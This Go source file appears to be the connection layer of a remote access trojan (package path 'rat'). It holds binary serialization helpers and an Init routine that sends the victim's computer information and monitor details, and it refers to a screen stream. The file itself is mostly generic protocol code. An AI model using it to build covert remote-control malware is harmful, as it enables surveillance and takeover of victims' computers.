package main

import (
	"encoding/binary"
	"io"
	"net"
	"rat/common"
)

type Connection struct {
	net.Conn
	common.Writer
	common.Reader
}

var Queue chan OutgoingPacket

func (c *Connection) Init() {
	Queue <- ComputerInfoPacket{}
	Queue <- MonitorsPacket{}
}

func (c *Connection) Close() {
	screenStream = false

	c.Conn.Close()
}

func (c *Connection) WriteInt(i int) error {
	i32 := int32(i)
	return binary.Write(c, common.ByteOrder, &i32)
}

func (c *Connection) WriteFloat(f float32) error {
	return binary.Write(c, common.ByteOrder, &f)
}

func (c *Connection) WriteBool(b bool) error {
	var byt byte

	switch b {
	case true:
		byt = 1
	default:
		byt = 0
	}
	data := make([]byte, 1)
	data[0] = byt

	_, err := c.Write(data)

	return err
}

func (c *Connection) WriteString(s string) error {
	err := c.WriteInt(len(s))

	if err != nil {
		return err
	}

	c.Conn.Write([]byte(s))
	return err
}

func (c *Connection) ReadString() (string, error) {
	n, err := c.ReadInt()

	if err != nil {
		return "", err
	}

	buf := make([]byte, n)
	io.ReadFull(c, buf)

	s := string(buf)

	return s, err
}

func (c *Connection) ReadInt() (int, error) {
	var n int32
	err := binary.Read(c, common.ByteOrder, &n)

	return int(n), err
}

func (c *Connection) ReadFloat() (float32, error) {
	var f float32
	err := binary.Read(c, common.ByteOrder, &f)
	return f, err
}

func (c *Connection) ReadBool() (bool, error) {
	b := make([]byte, 1)
	_, err := c.Read(b)
	return b[0] == 1, err
}

func (c *Connection) ReadHeader() (common.PacketHeader, error) {
	var h common.PacketHeader
	err := binary.Read(c, common.ByteOrder, &h)

	return h, err
}

func (c *Connection) WriteHeader(header common.PacketHeader) error {
	return binary.Write(c.Conn, common.ByteOrder, header)
}

func (c *Connection) WritePacket(packet OutgoingPacket) error {
	err := c.WriteHeader(packet.GetHeader())

	if err != nil {
		return err
	}

	return packet.Write(c)
}
